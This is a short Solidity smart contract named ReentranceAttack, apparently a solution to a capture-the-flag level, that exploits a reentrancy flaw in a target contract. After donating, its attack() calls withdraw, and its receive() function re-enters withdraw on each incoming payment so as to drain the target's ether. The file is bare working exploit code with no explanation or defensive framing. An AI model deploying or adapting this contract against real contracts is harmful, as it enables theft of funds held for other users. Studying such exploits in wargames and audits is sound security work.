pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance private immutable target;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    function attack() public {
        target.withdraw(target.balanceOf(address(this)));
    }

    receive() external payable {
        target.withdraw(target.balanceOf(address(this)));
    }
}
